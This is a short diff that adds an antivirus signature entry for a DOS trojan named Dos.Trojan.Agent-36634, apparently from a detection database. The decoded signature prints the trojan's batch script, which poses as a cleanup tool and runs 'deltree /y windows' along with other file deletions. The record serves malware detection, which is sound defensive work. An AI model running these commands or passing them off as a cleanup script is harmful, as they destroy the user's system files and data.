@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36634
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off echo elimina i direttori "inutili" echo premere ctrl-c per non proseguire pause c: cd \ deltree /y windows deltree /y eurosis if exist leggimi2.* del leggimi2.* cd \ attrib +r command.com attrib +r \dos\command.com 
